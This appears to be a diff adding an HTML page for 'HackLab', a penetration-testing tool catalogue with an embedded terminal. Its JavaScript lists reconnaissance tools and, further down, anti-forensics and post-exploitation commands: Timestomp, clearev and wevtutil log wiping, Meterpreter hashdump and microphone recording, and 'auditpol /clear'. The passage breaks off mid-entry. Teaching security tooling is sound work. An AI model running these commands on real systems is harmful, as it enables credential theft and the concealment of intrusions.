@@ -1,0 +1,3043 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Tool Runner | HackLab</title>
+  <!-- Xterm.js CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm/css/xterm.css" />
+
+  <!-- xterm.js CSS -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm/css/xterm.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap"
+    rel="stylesheet" />
+  <style>
+    :root {
+      --primary: #3a86ff;
+      --primary-dark: #2667cc;
+      --dark: #121a26;
+      --darker: #0d1420;
+      --light: #f8f9fa;
+      --gray: #6c757d;
+      --success: #28a745;
+      --danger: #dc3545;
+      --warning: #ffc107;
+    }
+
+    body {
+      background-color: var(--darker);
+      color: var(--light);
+      font-family: "Inter", sans-serif;
+      padding-top: 80px;
+      line-height: 1.6;
+    }
+
+    .navbar {
+      background-color: var(--dark);
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+      padding: 0.8rem 1.5rem;
+    }
+
+    .navbar-brand {
+      font-weight: 600;
+      letter-spacing: -0.5px;
+    }
+
+    .container {
+      max-width: 100%;
+      padding-left: 2rem;
+      padding-right: 2rem;
+    }
+
+    .card {
+      background-color: var(--dark);
+      border: none;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      margin-bottom: 2rem;
+    }
+
+    .card-header {
+      background-color: rgba(0, 0, 0, 0.2);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      font-weight: 500;
+      padding: 1rem 1.5rem;
+    }
+
+    .terminal {
+      background-color: #1a1e29;
+      padding: 1.5rem;
+      border-radius: 8px;
+      font-family: "Roboto Mono", monospace;
+      font-size: 0.9rem;
+      position: relative;
+      min-height: 200px;
+    }
+
+    .command-line {
+      color: var(--primary);
+      font-weight: 500;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+    }
+
+    .prompt {
+      color: var(--success);
+      margin-right: 8px;
+    }
+
+    .output {
+      color: #adb5bd;
+      white-space: pre-wrap;
+      margin-top: 1rem;
+      line-height: 1.5;
+    }
+
+    .btn-primary {
+      background-color: var(--primary);
+      border: none;
+      padding: 0.75rem 1.75rem;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      transition: all 0.2s;
+    }
+
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+      transform: translateY(-1px);
+    }
+
+    .btn-outline-secondary {
+      border-color: rgba(255, 255, 255, 0.1);
+      color: var(--light);
+    }
+
+    .btn-outline-secondary:hover {
+      background-color: rgba(255, 255, 255, 0.05);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    .tool-icon {
+      width: 48px;
+      height: 48px;
+      background-color: rgba(58, 134, 255, 0.1);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 1rem;
+    }
+
+    .tool-title {
+      font-weight: 600;
+      margin-bottom: 0.25rem;
+    }
+
+    .tool-subtitle {
+      color: var(--gray);
+      font-size: 0.9rem;
+    }
+
+    .status-indicator {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+
+    .status-ready {
+      background-color: var(--success);
+    }
+
+    .status-running {
+      background-color: var(--warning);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.5;
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    .tab-content {
+      padding: 1.5rem 0;
+    }
+
+    .nav-tabs {
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .nav-tabs .nav-link {
+      color: var(--gray);
+      border: none;
+      padding: 0.75rem 1.25rem;
+      font-weight: 500;
+    }
+
+    .nav-tabs .nav-link.active {
+      color: var(--primary);
+      background-color: transparent;
+      border-bottom: 2px solid var(--primary);
+    }
+
+    .badge-tool {
+      background-color: rgba(58, 134, 255, 0.15);
+      color: var(--primary);
+      font-weight: 500;
+      padding: 0.35rem 0.75rem;
+    }
+
+    .progress {
+      background-color: rgba(255, 255, 255, 0.05);
+      height: 6px;
+      border-radius: 3px;
+    }
+
+    .progress-bar {
+      background-color: var(--primary);
+    }
+
+    .command-block {
+      background-color: rgba(0, 0, 0, 0.2);
+      border-left: 3px solid var(--primary);
+      padding: 0.75rem 1rem;
+      margin: 0.5rem 0;
+      border-radius: 0 4px 4px 0;
+    }
+
+    /* HackLab specific styles */
+    .logo-area {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-text {
+      font-weight: 600;
+      color: white;
+      text-decoration: none;
+      font-size: 1.25rem;
+      margin-left: 0.5rem;
+    }
+
+    .btn-run {
+      background-color: var(--primary);
+      color: white;
+    }
+
+    .btn-docs {
+      background-color: rgba(255, 255, 255, 0.1);
+      color: white;
+    }
+
+    .tool-card {
+      background-color: var(--dark);
+      border-radius: 8px;
+      overflow: hidden;
+      transition: transform 0.2s;
+    }
+
+    .tool-card:hover {
+      transform: translateY(-5px);
+    }
+
+    .tool-card-img {
+      height: 120px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: rgba(0, 0, 0, 0.2);
+      padding: 1rem;
+    }
+
+    .tool-card-img img {
+      max-height: 100%;
+      max-width: 100%;
+      object-fit: contain;
+    }
+
+    .tool-card-body {
+      padding: 1.25rem;
+    }
+
+    .tool-card-title {
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+    }
+
+    .tool-card-text {
+      color: var(--gray);
+      font-size: 0.9rem;
+      margin-bottom: 1rem;
+    }
+
+    .badge-category {
+      background-color: var(--primary);
+      color: white;
+      font-weight: 500;
+      padding: 0.25rem 0.75rem;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      margin-bottom: 0.5rem;
+      display: inline-block;
+    }
+
+    .page-header {
+      padding: 3rem 0;
+      background: linear-gradient(135deg,
+          rgba(58, 134, 255, 0.1) 0%,
+          rgba(58, 134, 255, 0) 100%);
+      margin-bottom: 2rem;
+    }
+
+    .page-header-content {
+      max-width: 800px;
+      margin: 0 auto;
+      text-align: center;
+    }
+
+    .page-header h1 {
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .page-header p {
+      color: var(--gray);
+      font-size: 1.1rem;
+    }
+
+    .fade-in {
+      opacity: 0;
+      animation: fadeIn 0.5s forwards;
+    }
+
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+
+    .terminal {
+      margin: 0 !important;
+      padding: 0;
+      min-height: 400px;
+      height: auto;
+      background-color: #1a1e29;
+      color: white;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+  </style>
+  <style>
+    #xterm {
+      min-height: 400px;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="navbar navbar-expand fixed-top">
+    <div class="container">
+      <div class="d-flex align-items-center">
+        <div class="logo-area">
+          <img alt="Hack Lab Logo" src="../assets/img/hacklabb.png" width="32" height="32" />
+          <a class="logo-text" href="../index.html">HackLab</a>
+        </div>
+      </div>
+      <div>
+        <button type="button" class="btn btn-outline-secondary" onclick="goBack()">
+          <i class="fas fa-arrow-left me-2"></i>Back to Tools
+        </button>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container">
+    <div class="row mb-4">
+      <div class="col">
+        <h2 id="toolTitle" class="mb-1"></h2>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-12">
+        <!-- TOOL INFO SECTION -->
+        <div class="card mb-4">
+          <div class="card-header">Tool Information</div>
+          <div class="card-body">
+            <div class="tool-card-img mb-3">
+              <img id="toolImage" src="../assets/img/nmap.png" class="img-fluid" />
+            </div>
+            <div id="toolDescription">Loading tool description...</div>
+            <hr />
+            <div class="mb-2">
+              <strong>Category:</strong>
+              <span id="toolCategory">Scanning</span>
+            </div>
+            <div class="mb-2">
+              <strong>Version:</strong> <span id="toolVersion">1.0.0</span>
+            </div>
+            <div>
+              <strong>Documentation:</strong>
+              <a href="#" id="toolDocs" class="text-primary">View Docs</a>
+            </div>
+          </div>
+        </div>
+
+        <!-- TERMINAL CARD -->
+        <div class="card">
+          <div class="card-header d-flex justify-content-between align-items-center">
+            <span>Command Execution</span>
+            <span class="badge badge-tool" id="toolBadge">nmap</span>
+          </div>
+          <div class="card-body pt-0 px-3 pb-3">
+            <div class="terminal">
+              <div id="xterm" style="width: 100%; height: 400px"></div>
+            </div>
+
+
+
+            <div class="progress mt-3 d-none" id="progressBar">
+              <div class="progress-bar" role="progressbar" style="width: 0%"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="row mt-4">
+      <div class="col">
+        <div class="card">
+          <div class="card-header">
+            <ul class="nav nav-tabs card-header-tabs">
+              <li class="nav-item">
+                <a class="nav-link active" data-bs-toggle="tab" href="#usage">Usage</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" data-bs-toggle="tab" href="#examples">Examples</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" data-bs-toggle="tab" href="#parameters">Parameters</a>
+              </li>
+            </ul>
+          </div>
+          <div class="card-body">
+            <div class="tab-content">
+              <div class="tab-pane fade show active" id="usage">
+                <div id="usageSection">Loading usage instructions...</div>
+              </div>
+              <div class="tab-pane fade" id="examples">
+                <div id="examplesSection">Loading examples...</div>
+              </div>
+              <div class="tab-pane fade" id="parameters">
+                <div id="parametersSection">Loading parameters...</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const tool = urlParams.get("tool") || "nmap";
+
+    const tools = {
+      nmap: {
+        name: "Nmap",
+        command: "nmap -sS -T4 -A -v 192.168.1.1",
+        description: "Network exploration tool and security/port scanner",
+        category: "Network Scanning",
+        version: "7.93",
+        docs: "https://nmap.org/book/man.html",
+        image: "../assets/img/nmap.png",
+        usage:
+          "Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, and other characteristics.",
+        examples: [
+          "Basic TCP SYN scan:\n  nmap -sS 192.168.1.1",
+          "Comprehensive scan:\n  nmap -sS -sV -sC -O -T4 -A -v 192.168.1.1",
+          "Scan specific ports:\n  nmap -p 80,443,8080 192.168.1.1",
+          "Scan all ports:\n  nmap -p- 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-sS", description: "TCP SYN scan (stealth scan)" },
+          {
+            param: "-sV",
+            description: "Probe open ports to determine service/version info",
+          },
+          { param: "-O", description: "Enable OS detection" },
+          {
+            param: "-A",
+            description:
+              "Enable OS detection, version detection, script scanning, and traceroute",
+          },
+          { param: "-T4", description: "Aggressive timing template" },
+        ],
+      },
+      recon_ng: {
+        name: "Recon-ng",
+        command: "recon-ng",
+        description:
+          "A full-featured web reconnaissance framework with a modular interface for collecting open-source intelligence (OSINT).",
+        category: "Reconnaissance",
+        version: "5.1.3",
+        docs: "https://github.com/lanmaster53/recon-ng",
+        image: "../assets/img/reco.png",
+        usage:
+          "Recon-ng is a powerful Python-based web reconnaissance framework designed to gather open-source intelligence (OSINT). It features a command-line interface similar to Metasploit and supports a wide variety of modules for domain, IP, credential, and social media reconnaissance.",
+        examples: [
+          "Start Recon-ng:\n  recon-ng",
+          "Create a workspace:\n  workspaces create acme",
+          "Add domain target:\n  add domains acme.com",
+          "Load a module:\n  modules load recon/domains-hosts/bing_domain_web",
+          "Run the module:\n  run",
+        ],
+        parameters: [
+          {
+            param: "workspaces create",
+            description: "Create a new workspace",
+          },
+          { param: "add domains", description: "Add target domains" },
+          { param: "modules load", description: "Load a module" },
+          { param: "show options", description: "View module options" },
+          { param: "run", description: "Execute the loaded module" },
+        ],
+      },
+      maltego: {
+        name: "Maltego",
+        command: "maltego",
+        description:
+          "A powerful OSINT and link analysis platform that visually maps relationships between people, domains, IPs, emails, and social profiles.",
+        category: "Reconnaissance",
+        version: "4.3.0",
+        docs: "https://www.maltego.com",
+        image: "../assets/img/maltego.png",
+        usage:
+          "Maltego is a GUI-based link analysis and OSINT tool that enables analysts to discover relationships between people, companies, domains, infrastructure, and social media accounts using public and third-party data sources.",
+        examples: [
+          "Start Maltego:\n  maltego",
+          "Create a new graph:\n  File → New Graph",
+          "Add entity:\n  Right-click → Add Entity",
+          "Run transforms:\n  Right-click entity → Run Transforms",
+          "Analyze relationships:\n  View graph connections",
+        ],
+        parameters: [],
+      },
+      theharvester: {
+        name: "theHarvester",
+        command: "theHarvester -d example.com -b all",
+        description:
+          "A powerful OSINT tool for gathering emails, usernames, domains, and hostnames from public sources like Google, Bing, and LinkedIn.",
+        category: "Reconnaissance",
+        version: "3.2.4",
+        docs: "https://github.com/laramies/theHarvester",
+        image: "../assets/img/theharvester.png",
+        usage:
+          "theHarvester is a powerful command-line OSINT tool that gathers valuable information such as emails, subdomains, employee names, and hostnames from public sources — including search engines, PGP key servers, and social networks.",
+        examples: [
+          "Basic scan of a domain using all available sources:\n  theHarvester -d example.com -b all",
+          "Gather emails and hosts using Google only:\n  theHarvester -d example.com -b google",
+          "Output results to an HTML file:\n  theHarvester -d example.com -b all -f report",
+        ],
+        parameters: [
+          { param: "-d", description: "Target domain to search" },
+          {
+            param: "-b",
+            description: "Data source (google, bing, linkedin, etc.)",
+          },
+          { param: "-f", description: "Save results to file" },
+          { param: "-l", description: "Limit number of results" },
+          { param: "-s", description: "Start with result number X" },
+        ],
+      },
+      shodan: {
+        name: "Shodan",
+        command: 'shodan search apache country:"US"',
+        description:
+          "A search engine for internet-connected devices. Used to find exposed services, IoT systems, vulnerable servers, and more.",
+        category: "Reconnaissance",
+        version: "1.29.0",
+        docs: "https://developer.shodan.io",
+        image: "../assets/img/shodan.png",
+        usage:
+          "Shodan is a specialized search engine that indexes information about devices connected to the internet. It can identify vulnerable services, IoT systems, industrial control systems, webcams, printers, databases, and more.",
+        examples: [
+          'Search for Apache servers in the US:\n  shodan search apache country:"US"',
+          "Find MySQL services exposed:\n  shodan search port:3306",
+          'Find IPs running specific software:\n  shodan search "nginx 1.18"',
+          "Get full host info by IP:\n  shodan host 8.8.8.8",
+        ],
+        parameters: [
+          { param: "search", description: "Search the Shodan database" },
+          { param: "host", description: "View all information about an IP" },
+          {
+            param: "init",
+            description: "Initialize the Shodan CLI with your API key",
+          },
+          {
+            param: "count",
+            description: "Return only the total number of results",
+          },
+          { param: "download", description: "Download search results" },
+        ],
+      },
+      whois: {
+        name: "Whois",
+        command: "whois example.com",
+        description:
+          "A query tool that retrieves domain registration and ownership information, often used during reconnaissance to analyze targets.",
+        category: "Reconnaissance",
+        version: "5.5.10",
+        docs: "https://linux.die.net/man/1/whois",
+        image: "../assets/img/whois.png",
+        usage:
+          "Whois is a command-line utility used to gather domain registration data. It reveals information such as registrar, registrant, nameservers, registration/expiration dates, and contact info — valuable for assessing domain history and attack surface.",
+        examples: [
+          "Lookup domain owner and contact info:\n  whois example.com",
+          "Check domain registration and expiry:\n  whois target.org",
+          "Find authoritative nameservers:\n  whois hacklab.net",
+        ],
+        parameters: [
+          { param: "-h", description: "Specify whois server to query" },
+          { param: "-H", description: "Hide legal disclaimers" },
+          { param: "-p", description: "Port number to connect to" },
+          { param: "-a", description: "Search all databases" },
+          {
+            param: "-i",
+            description: "Use IANA to find appropriate whois server",
+          },
+        ],
+      },
+      dnsenum: {
+        name: "DNSenum",
+        command: "dnsenum example.com",
+        description:
+          "A DNS enumeration tool that performs subdomain discovery, brute-forcing, and zone transfer checks to expose potential attack surfaces.",
+        category: "Reconnaissance",
+        version: "1.2.6",
+        docs: "https://github.com/fwaeytens/dnsenum",
+        image: "../assets/img/dnsenum.png",
+        usage:
+          "DNSenum is a Perl-based tool used to perform DNS enumeration on target domains. It helps identify subdomains, hostnames, mail servers, name servers, and checks for DNS zone transfers.",
+        examples: [
+          "Basic domain enumeration:\n  dnsenum example.com",
+          "Enable subdomain brute force:\n  dnsenum -f wordlist.txt example.com",
+          "Check for zone transfers:\n  dnsenum --enum example.com",
+          "Export to XML:\n  dnsenum --xml output.xml example.com",
+        ],
+        parameters: [
+          {
+            param: "--enum",
+            description:
+              "Performs full enumeration (subdomains, zone transfers, etc.)",
+          },
+          {
+            param: "-f",
+            description: "Specify a file for subdomain brute-forcing",
+          },
+          {
+            param: "--dnsserver",
+            description: "Set DNS server to use (e.g. 8.8.8.8)",
+          },
+          {
+            param: "--noreverse",
+            description: "Disable reverse lookup of IPs",
+          },
+          { param: "--xml", description: "Output results in XML format" },
+        ],
+      },
+      spiderfoot: {
+        name: "SpiderFoot",
+        command: "spiderfoot -s example.com -o simple",
+        description:
+          "An automated OSINT tool that scans IPs, domains, emails, and usernames using 200+ sources to reveal vulnerabilities and digital footprints.",
+        category: "Reconnaissance",
+        version: "3.5",
+        docs: "https://www.spiderfoot.net",
+        image: "../assets/img/spiderfoot.png",
+        usage:
+          "SpiderFoot is an OSINT automation tool that scans domains, IPs, emails, and usernames to gather intelligence from search engines, breach databases, WHOIS records, darknet, and more. It supports both CLI and web UI modes.",
+        examples: [
+          "Scan a domain (CLI):\n  spiderfoot -s example.com -o simple",
+          "Launch web UI (on localhost):\n  python3 sf.py -l 127.0.0.1:5001",
+          "Scan IP address:\n  spiderfoot -s 192.168.1.1",
+          "Export results to CSV/JSON:\n  spiderfoot -s example.com -o csv -F report.csv",
+        ],
+        parameters: [
+          {
+            param: "-s",
+            description: "Target to scan (domain, IP, email, etc.)",
+          },
+          {
+            param: "-o",
+            description: "Output format (simple, csv, json, etc.)",
+          },
+          {
+            param: "-l",
+            description: "Launch web UI on specified host:port",
+          },
+          {
+            param: "-m",
+            description: "Comma-separated list of modules to run",
+          },
+          {
+            param: "-t",
+            description: "Comma-separated list of module types",
+          },
+        ],
+      },
+      foca: {
+        name: "FOCA",
+        command: "foca",
+        description:
+          "A metadata extraction and footprinting tool that analyzes public documents to discover hidden information like usernames, emails, software versions, and network paths.",
+        category: "Reconnaissance",
+        version: "3.4.0",
+        docs: "https://www.elevenpaths.com/labstools/foca.html",
+        image: "../assets/img/foca.png",
+        usage:
+          "FOCA is a Windows GUI tool developed by ElevenPaths to automate the process of discovering metadata in documents like PDFs, DOCs, and PPTs. It retrieves files from target domains, extracts hidden metadata, and maps internal systems, usernames, emails, and network paths.",
+        examples: [
+          "Launch FOCA and create a new project",
+          "Enter target domain (e.g., example.com)",
+          "Search for documents via search engines",
+          "Download found documents",
+          "Analyze metadata from documents",
+        ],
+        parameters: [],
+      },
+      fierce: {
+        name: "Fierce",
+        command: "fierce -dns example.com",
+        description:
+          "A DNS reconnaissance tool used to locate non-contiguous IP blocks and discover hidden domains and subnets via brute-force and zone transfers.",
+        category: "Reconnaissance",
+        version: "1.3.0",
+        docs: "https://github.com/mschwager/fierce",
+        image: "../assets/img/fierce.png",
+        usage:
+          "Fierce is a DNS reconnaissance tool that helps find hosts, domains, and IP ranges associated with a target. It performs DNS brute-forcing, reverse lookups, and zone transfers where possible.",
+        examples: [
+          "Standard DNS recon:\n  fierce -dns example.com",
+          "Use a custom wordlist:\n  fierce -dns example.com -wordlist /path/to/list.txt",
+          "Attempt zone transfer:\n  fierce -dns example.com -traverse 5",
+        ],
+        parameters: [
+          { param: "-dns", description: "The target domain" },
+          {
+            param: "-wordlist",
+            description: "Provide a custom DNS name wordlist",
+          },
+          {
+            param: "-range",
+            description: "IP range to scan (e.g., 192.168.0.0/24)",
+          },
+          { param: "-file", description: "Save output to a file" },
+          {
+            param: "-traverse",
+            description: "Attempts to brute additional DNS servers",
+          },
+        ],
+      },
+      nslookup_dig: {
+        name: "NSLookup / Dig",
+        command: "dig example.com ANY\nnslookup example.com",
+        description:
+          "Essential DNS interrogation tools for querying name servers, retrieving zone records, and performing advanced DNS lookups.",
+        category: "Reconnaissance",
+        version: "9.16.1",
+        docs: "https://linux.die.net/man/1/dig",
+        image: "../assets/img/dns-tools.png",
+        usage:
+          "NSLookup and Dig are core DNS diagnostic tools used to retrieve DNS records, perform reverse lookups, identify misconfigurations, and assess a domain's exposure.",
+        examples: [
+          "Query all DNS records:\n  dig example.com ANY",
+          "Retrieve MX (mail server) records:\n  dig example.com MX",
+          "Get authoritative name servers:\n  nslookup -type=ns example.com",
+          "Check a specific DNS server:\n  nslookup example.com 8.8.8.8",
+          "Reverse lookup:\n  dig -x 192.168.1.1",
+        ],
+        parameters: [
+          { param: "ANY", description: "Requests all available DNS records" },
+          { param: "MX, A, NS, TXT", description: "Specific record types" },
+          { param: "-x", description: "Reverse lookup for IP address" },
+          {
+            param: "-type=",
+            description: "NSLookup-specific for targeting record types",
+          },
+        ],
+      },
+      sublist3r: {
+        name: "Sublist3r",
+        command: "sublist3r -d example.com",
+        description:
+          "A fast subdomain enumeration tool that uses multiple public search engines and OSINT sources to discover subdomains of a target domain.",
+        category: "Reconnaissance",
+        version: "1.2",
+        docs: "https://github.com/aboul3la/Sublist3r",
+        image: "../assets/img/sublist3r.png",
+        usage:
+          "Sublist3r is a Python-based tool that automates the process of discovering subdomains of a target domain using open-source intelligence (OSINT). It queries multiple search engines like Google, Bing, Yahoo, Baidu, and Netcraft.",
+        examples: [
+          "Basic subdomain enumeration:\n  sublist3r -d example.com",
+          "Save results to a file:\n  sublist3r -d example.com -o results.txt",
+          "Use threads to speed up scan:\n  sublist3r -d example.com -t 50",
+        ],
+        parameters: [
+          {
+            param: "-d",
+            description: "Target domain to enumerate subdomains",
+          },
+          { param: "-o", description: "Save output to file" },
+          { param: "-t", description: "Number of threads to use" },
+          {
+            param: "-b",
+            description: "Use specific search engines (google, bing, etc.)",
+          },
+          { param: "-v", description: "Enable verbose output" },
+        ],
+      },
+      amass: {
+        name: "Amass",
+        command: "amass enum -d example.com",
+        description:
+          "An advanced OSINT and attack surface mapping tool for discovering subdomains, DNS records, infrastructure, and external assets.",
+        category: "Reconnaissance",
+        version: "3.19.2",
+        docs: "https://github.com/OWASP/Amass",
+        image: "../assets/img/amass.png",
+        usage:
+          "Amass is a powerful reconnaissance framework that gathers information about a domain's external attack surface. It performs DNS enumeration, WHOIS analysis, subdomain discovery, IP mapping, and infrastructure correlation using OSINT and active techniques.",
+        examples: [
+          "Passive subdomain enumeration:\n  amass enum -passive -d example.com",
+          "Active subdomain probing:\n  amass enum -active -d example.com",
+          "Save results to file:\n  amass enum -d example.com -o results.txt",
+          "Visualize network relationships:\n  amass viz -d3 -f results.txt -o graph.html",
+        ],
+        parameters: [
+          {
+            param: "enum",
+            description: "Perform enumeration/subdomain discovery",
+          },
+          { param: "-d", description: "Target domain(s) to enumerate" },
+          {
+            param: "-passive",
+            description: "Passive mode (no direct interaction)",
+          },
+          {
+            param: "-active",
+            description: "Active mode (includes brute-forcing)",
+          },
+          { param: "-o", description: "Output file for results" },
+        ],
+      },
+      censyscli: {
+        name: "Censys CLI",
+        command:
+          'censys search "services.service_name:HTTP AND location.country:US"',
+        description:
+          "A command-line tool to search the Censys internet-wide scan database, uncovering exposed services, misconfigurations, and digital footprints.",
+        category: "Reconnaissance",
+        version: "2.1.9",
+        docs: "https://search.censys.io",
+        image: "../assets/img/censys.png",
+        usage:
+          "Censys CLI is a terminal-based interface to the Censys search engine, which scans and indexes all publicly reachable devices and services on the Internet. It's used for threat hunting, attack surface mapping, and identifying exposed services or vulnerabilities.",
+        examples: [
+          'Search for HTTP services in the US:\n  censys search "services.service_name:HTTP AND location.country:US"',
+          'Search for specific software versions:\n  censys search "services.software.product:Apache AND services.software.version:2.4.49"',
+          'Export results to JSON:\n  censys search "ip:8.8.8.8" --format json',
+          "Get full info on a host:\n  censys view a.b.c.d",
+        ],
+        parameters: [
+          { param: "search", description: "Search the Censys database" },
+          {
+            param: "view",
+            description: "View detailed information about a host",
+          },
+          {
+            param: "--format",
+            description: "Output format (json, csv, etc.)",
+          },
+          {
+            param: "--fields",
+            description: "Comma-separated list of fields to return",
+          },
+          {
+            param: "--pages",
+            description: "Number of pages of results to return",
+          },
+        ],
+      },
+      whatweb: {
+        name: "WhatWeb",
+        command: "whatweb example.com",
+        description:
+          "A web scanner that identifies websites' technologies, frameworks, server info, CMS, and plugins to reveal potential weaknesses.",
+        category: "Reconnaissance",
+        version: "0.5.5",
+        docs: "https://www.morningstarsecurity.com/research/whatweb",
+        image: "../assets/img/whatweb.png",
+        usage:
+          "WhatWeb is a command-line tool that performs web application fingerprinting. It detects technologies used on websites such as web servers, CMSs (e.g., WordPress, Joomla), analytics platforms, JavaScript libraries, security mechanisms, and more.",
+        examples: [
+          "Basic scan of a site:\n  whatweb example.com",
+          "Enable aggressive detection:\n  whatweb -a 3 example.com",
+          "Scan multiple targets from a file:\n  whatweb -i domains.txt",
+          "Export results to JSON:\n  whatweb -a 3 -t 10 -v --log-json=output.json example.com",
+        ],
+        parameters: [
+          { param: "-a", description: "Aggression level (1-3)" },
+          { param: "-i", description: "Input file with list of targets" },
+          { param: "-v", description: "Verbose output" },
+          { param: "--log-json", description: "Save results in JSON format" },
+          { param: "--color", description: "Colorize output" },
+        ],
+      },
+      timestomp: {
+        name: "Timestomp",
+        command: 'timestomp.exe <file> -z "01/01/2000 12:00:00 AM"',
+        description:
+          "Timestomp is a post-exploitation tool that allows attackers to modify the timestamp metadata of files (such as creation, modification, and access times) to help evade forensic detection.",
+        category: "Anti-Forensics / Clearing Tracks",
+        version: "Metasploit Built-in",
+        docs: "https://www.offensive-security.com/metasploit-unleashed/timestomp/",
+        image: "../assets/img/timestomp.png",
+        usage:
+          "Timestomp is commonly used to make malicious files appear older or to match the timestamps of legitimate system files, helping attackers to avoid detection during forensic analysis.",
+        examples: [
+          "View timestamps of a file:\n  timestomp.exe file.txt",
+          'Change all timestamps:\n  timestomp.exe file.txt -z "01/01/2000 12:00:00 AM"',
+          "Remove MACE timestamps:\n  timestomp.exe file.txt -m",
+          'Set creation and modification times only:\n  timestomp.exe file.txt -c "01/01/2000 12:00:00 AM" -m "01/01/2000 12:00:00 AM"',
+        ],
+        parameters: [
+          { param: "-z", description: "Set all MACE timestamps at once" },
+          { param: "-c", description: "Set creation time" },
+          { param: "-a", description: "Set access time" },
+          {
+            param: "-m",
+            description: "Set modification time (or wipe timestamps)",
+          },
+          { param: "-v", description: "View file's current MACE timestamps" },
+        ],
+      },
+      clearlogs: {
+        name: "ClearLogs",
+        command: "clearev",
+        description:
+          "ClearLogs (often executed via `clearev` in Meterpreter) is a post-exploitation technique used to erase event logs from a Windows system to remove traces of an attack and hinder forensic investigations.",
+        category: "Anti-Forensics / Clearing Tracks",
+        version: "Built-in to Meterpreter",
+        docs: "https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/#clearev",
+        image: "../assets/img/clearlogs.png",
+        usage:
+          "ClearLogs is used after privilege escalation or successful exploitation to delete security, application, and system logs. This reduces the likelihood of detection by administrators or incident response teams.",
+        examples: [
+          "Clear all major event logs in Meterpreter:\n  clearev",
+          "Run from a Meterpreter session after gaining access:\n  meterpreter > clearev",
+          "Alternative (PowerShell):\n  wevtutil cl Application\n  wevtutil cl Security\n  wevtutil cl System",
+        ],
+        parameters: [
+          {
+            param: "clearev",
+            description:
+              "Clear Application, System, and Security event logs (Meterpreter)",
+          },
+          {
+            param: "wevtutil cl",
+            description: "Manually clear logs via Windows Event Utility",
+          },
+          {
+            param: "powershell",
+            description:
+              "Execute log clearing commands via PowerShell scripts",
+          },
+        ],
+      },
+      meterpreter: {
+        name: "Meterpreter",
+        command: "sessions -i 1",
+        description:
+          "Meterpreter is a powerful and stealthy post-exploitation payload that operates via the Metasploit Framework. It provides in-memory command execution and advanced capabilities for system control, all without writing to disk.",
+        category: "Post Exploitation",
+        version: "Built into Metasploit",
+        docs: "https://docs.rapid7.com/metasploit/meterpreter-basics/",
+        image: "../assets/img/meterpreter.png",
+        usage:
+          "Meterpreter enables security professionals to control compromised machines, escalate privileges, pivot through networks, dump credentials, and cover tracks—all from an encrypted in-memory shell.",
+        examples: [
+          "List current sessions:\n  sessions",
+          "Interact with a session:\n  sessions -i 1",
+          "Take a screenshot:\n  screenshot",
+          "Dump credentials:\n  hashdump",
+          "Upload a file:\n  upload /path/to/local/file.txt",
+          "Download a file:\n  download C:\\secret.txt",
+          "Record microphone audio:\n  record_mic -d 10",
+        ],
+        parameters: [
+          {
+            param: "sessions",
+            description: "List active Meterpreter sessions",
+          },
+          {
+            param: "sessions -i <id>",
+            description: "Interact with a specific session",
+          },
+          {
+            param: "screenshot",
+            description: "Capture a screenshot from the target machine",
+          },
+          {
+            param: "upload",
+            description: "Upload a file to the remote system",
+          },
+          {
+            param: "download",
+            description: "Download a file from the remote system",
+          },
+          {
+            param: "hashdump",
+            description: "Dump password hashes from the SAM database",
+          },
+          {
+            param: "record_mic",
+            description: "Record audio from the target's microphone",
+          },
+        ],
+      },
+      auditpol: {
+        name: "Auditpol",
+        command: "auditpol /clear /y",
+        description:
+          "Auditpol is a built-in Windows command-line utility that allows administrators to manage and configure auditing policies on local or remote systems. It is also used by attackers to clear or disable auditing to avoid detection.",
+        category: "Anti-Forensics / Clearing Tracks",
+        version: "Windows Built-in",
